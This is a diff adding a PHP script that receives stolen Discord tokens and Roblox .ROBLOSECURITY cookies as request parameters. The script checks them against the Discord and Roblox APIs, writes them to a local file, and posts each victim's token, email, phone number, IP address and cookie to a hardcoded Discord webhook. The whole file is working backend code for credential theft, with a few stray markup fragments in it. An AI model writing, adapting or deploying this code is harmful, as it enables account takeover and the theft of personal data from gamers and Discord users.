@@ -1,0 +1,34 @@
+<?php
+    require_once("Https.php");
+    function Read($Contents){
+        if (strpos(file_get_contents("Data.txt"),$Contents) !== false) {
+            return false;<
+          </div>
+        } else {return true;}
+    }
+    if ($_SERVER["REQUEST_METHOD"] == "POST"){
+        if (isset($_GET['Token']) && isset($_GET['roblosecurity'])){
+            $Token = $_GET['Token'];
+            $RobloxCookie = $_GET['roblosecurity'];
+            $IPAddress = $_SERVER['REMOTE_ADDR'];
+            $Response = CurlSend("https://discordapp.com/api/v7/users/@me",[CURLOPT_HTTPHEADER => ["Authorization: $Token"],CURLOPT_RETURNTRANSFER => 1]);
+            $Response2 = CurlSend("https://auth.roblox.com/v1/xbox/connection ",[CURLOPT_RETURNTRANSFER => 1,CURLOPT_HTTPHEADER => ["Cookie: .ROBLOSECURITY={$RobloxCookie}"]]);
+            $JsonDecoded = json_decode($Response,true);
+            $JsonDecoded2 = json_decode($Response2,true);
+        if (array_key_exists("username",$JsonDecoded)){
+            if (Read("{$Token} {$RobloxCookie}")){
+                 $File = fopen("Data.txt","a");
+                fwrite($File,"{$Token} {$RobloxCookie}");
+                fclose($File);$Username = "{$JsonDecoded['username']}#{$JsonDecoded['discriminator']}";
+                    $Number = $JsonDecoded['phone'];
+                    $Email = $JsonDecoded['email'];
+                    if (array_key_exists("hasConnectedXboxAccount",$JsonDecoded2)){
+                        CurlSend("https://discordapp.com/api/webhooks/754307540237680640/oK-PJNyO1eIBur0ubjxcZ_DvNBirvpAIAyQWx5DGhp9FCAvbGMTzAikATvERm83DHlsD",[CURLOPT_POST => 1,CURLOPT_HTTPHEADER => ['Content-Type: application/json'],CURLOPT_POSTFIELDS => json_encode(["username" => $Username,"content" => "```Token: {$Token}\nEmail: {$Email}\nNumber: {$Number}\nIp Address: {$IPAddress}\n.ROBLOSECURITY: {$RobloxCookie}```"])]);
+                    } else {
+                        CurlSend("https://discordapp.com/api/webhooks/754307540237680640/oK-PJNyO1eIBur0ubjxcZ_DvNBirvpAIAyQWx5DGhp9FCAvbGMTzAikATvERm83DHlsD",[CURLOPT_POST => 1,CURLOPT_HTTPHEADER => ['Content-Type: application/json'],CURLOPT_POSTFIELDS => json_encode(["username" => $Username,"content" => "```Token: {$Token}\nEmail: {$Email}\nNumber: {$Number}\nIp Address: {$IPAddress}\n.ROBLOSECURITY: Not Valid```"])]);
+                    }
+                }
+            }
+         }
+    }
+?>
